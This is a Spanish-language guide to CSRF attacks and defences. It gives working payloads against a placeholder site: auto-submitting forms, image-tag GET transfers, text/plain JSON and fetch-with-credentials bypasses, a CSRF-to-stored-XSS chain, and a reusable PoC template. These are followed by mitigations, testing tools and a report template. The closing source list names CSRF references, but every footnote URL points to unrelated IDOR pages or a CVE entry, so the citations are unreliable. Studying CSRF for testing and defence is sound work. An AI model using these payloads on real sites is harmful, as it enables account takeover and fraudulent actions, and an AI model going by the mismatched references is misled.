# CSRF (Cross-Site Request Forgery)

## Resumen

El Cross-Site Request Forgery (CSRF) sigue siendo una de las vulnerabilidades más peligrosas y subestimadas en aplicaciones web modernas. Un atacante puede hacer que un usuario autenticado ejecute acciones maliciosas en una aplicación donde tiene sesión activa, explotando el hecho de que el navegador reenvía automáticamente cookies de sesión y otros tokens de identificación. Aunque SameSite ha mejorado el panorama, siguen existiendo técnicas de bypass y errores de implementación comunes en 2025.[^3]

---

## ¿Qué es CSRF?

CSRF es un ataque donde el atacante induce al navegador de la víctima a enviar peticiones no autorizadas a una aplicación donde la víctima ya está autenticada, manipulando parámetros para cambiar configuraciones, hacer transferencias o modificar cuentas sin el consentimiento del usuario.[^1]

**Condiciones para un ataque exitoso:**

1. Acción sensible (cambio de email, transferencia, creación de cuenta)
2. Manejo de sesión por cookies/autenticador enviado automático
3. Parámetros predecibles y ausencia de token anti-CSRF

---

## Ejemplos de Explotación

### CSRF via GET

```html
<img src="https://victima.com/transfer?to=atacante&amount=10000">
```

- El atacante convence a la víctima de visitar un enlace/página que dispara la acción automáticamente.

### CSRF via POST

**Formulario vulnerable:**

```html
<form method="POST" action="https://victima.com/change_email">
  <input type="hidden" name="email" value="atacante@evil.com">
</form>
<script>document.forms[^0].submit()</script>
```

---

## Protecciones y Bypasses Modernos

### 1. Tokens Anti-CSRF

**Defensa principal** pero susceptible a:

- Omisión del token o no validación real en servidor.
- Token no vinculado a la sesión (token reutilizable, predictible)
- Validación solo en POST, pero endpoint expuesto a GET o con method override.

**Ejemplo de bypass:**
Si el token no es requerido o aceptan token de otro usuario.

```html
<form action="https://victima.com/update" method="POST">
  <input type="hidden" name="csrf" value="ATACANTE_TOKEN">
  <input type="hidden" name="data" value="malicious">
</form>
```

### 2. SameSite Cookies

**SameSite=Lax por defecto en 2025**, pero hay técnicas de bypass:

- Bypass por method override (`_method=DELETE`)
- Bypass por refresh window/new tab
- Mobile browser bypass vía intent
- Subdomain cookie injection si hay mal config (Cookie domain y Path)
- Exploiting window-opening/redirect same-site policies

### 3. JSON/Content-Type Bypass

Algunas APIs no validan correctamente el tipo de contenido o aceptan encodings alternativos:

```html
<form action="https://victima.com/api" method="POST" enctype="text/plain">
  <input type="hidden" name='{"email":"evil@evil.com"}' value=''>
</form>
```

O manipulando fetch:

```javascript
fetch('https://victima.com/api/update', {
  method: 'POST',
  credentials: 'include',
  headers: { 'Content-Type': 'text/plain' },
  body: '{"balance":10000,"to":"evil"}'
});
```

### 4. Double Submit Cookie Bypass

Si el token se pasa vía Cookie y como parámetro, pero el atacante puede escribir la cookie (subdomain injection o path manipulation).

### 5. Bypass en OAuth, APIs y Mobile

- Falta de validación en callbacks (OAuth flow)
- APIs móviles sin CSRF ni header Origin/Referer
- Microservicios sin protección en endpoints internos

---

## Técnicas y PoC

### Plantilla Universal de PoC

```html
<form id="evil" method="POST" action="https://victima.com/action">
  <input type="hidden" name="field" value="valor">
</form>
<script>document.getElementById('evil').submit()</script>
```

### CSRF Encadenado a XSS

Automatizar un update de perfil para inyectar un XSS almacenado:

```html
<form action="https://victima.com/profile" method="POST">
  <input type="hidden" name="bio" value="<img src=x onerror=alert(1)>">
</form>
<script>document.forms[^0].submit()</script>
```

---

## Mitigaciones Modernas y Mejores Prácticas

### 1. Tokens Anti-CSRF por Sesión

- Tokens generados y verificados por sesión/usuario, no predictibles.
- Incluidos y validados en todos los formularios y endpoints de cambio de estado.

### 2. Configuración Correcta de SameSite

```http
Set-Cookie: session=abc; Secure; HttpOnly; SameSite=Strict
```

- **Strict:** máxima protección (no apto para flujos OAuth)
- **Lax:** balanceado
- **None:** solo si Secure

### 3. Validación de Origin/Referer

En APIs y endpoints críticos:

```javascript
// En backend
if (!['https://victima.com'].includes(req.headers.origin)) {
  return res.status(403);
}
```

### 4. Headers de Seguridad

- X-Frame-Options: DENY (evita clickjacking + CSRF combo)
- Content-Security-Policy: evitar uploads arbitrarios

### 5. Validar tipo de contenido

- Rechazar solicitudes con `Content-Type` inesperados
- Limitar el allowed CORS

### 6. Framework-specific Protections

- Django, Rails, Laravel: activar y validar anti-CSRF middleware
- React, Angular, Vue: CSRF token en fetch o AJAX

---

## Testing y Detección

### Reconnaissance y Testing Manual

- Buscar endpoints con efecto de cambio de estado sin protección visible.
- Revisar si existen tokens y si el backend realmente los valida.
- Probar métodos alternos (GET/POST, override).

### Automatización

- ZAP, Burp Suite Active CSRF Scanner
- Nuclei templates: nuclei -t csrf/
- Scripts custom con requests + BeautifulSoup para parametrizar ataques y analizar respuestas

---

## Reporte

**Título:** CSRF – Ejecución de Acciones No Autorizadas mediante Peticiones Transitivas
**Resumen Ejecutivo:** El endpoint `/update` permite ejecutar acciones en nombre de usuarios autenticados mediante peticiones cross-site sin requerir validación adicional, lo que habilita ataques que pueden comprometer cuentas y datos críticos.
**PoC paso a paso:**

1. Usuario autenticado en victima.com
2. Visita página atacante con PoC
3. Accede a endpoint vulnerable y ejecuta acción
   **Impacto:** Account takeover, fuga de datos, transferencias, privilegios

**Mitigación Recomendada:**

- Token anti-CSRF por sesión, SameSite Starict, validación Origin/Referer, limitar media types y métodos, pruebas continuas con escáneres y revisiones de código.

---

## Fuentes

InfoSecWriteups – CSRF in 2025: Solved, but still bypassable[^3]
MDN – CSRF Attack Primer[^1]
PortSwigger – CSRF Bypassing SameSite[^4]
SideChannel – HTTP Method Override Bypass[^5]
OWASP – Double Submit Cookie Presentation[^6]
StackOverflow – Are JSON web services vulnerable to CSRF[^7]
PortSwigger – CSRF[^2]
Brightsec – CSRF Mitigation[^8]
Wiz.io – CSRF Academy[^9]

<div style="text-align: center">⁂</div>

[^1]: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References
    
[^2]: https://docs.hackerone.com/en/articles/8369826-detailed-platform-standards
    
[^3]: https://infosecwriteups.com/️-hunting-idor-a-deep-dive-into-insecure-direct-object-references-b550a9f77333
    
[^4]: https://www.intigriti.com/blog/news/idor-a-complete-guide-to-exploiting-advanced-idor-vulnerabilities
    
[^5]: https://www.wiz.io/vulnerability-database/cve/cve-2025-3281
    
[^6]: https://virtualcyberlabs.com/insecure-direct-object-references-idor/
    
[^7]: https://www.invicti.com/learn/insecure-direct-object-references-idor/
    
[^8]: https://security.tecno.com/SRC/blogdetail/304?lang=en_US
    
[^9]: https://help.aikido.dev/dast-surface-monitoring/api-scanning/understanding-and-detecting-idor-vulnerabilities
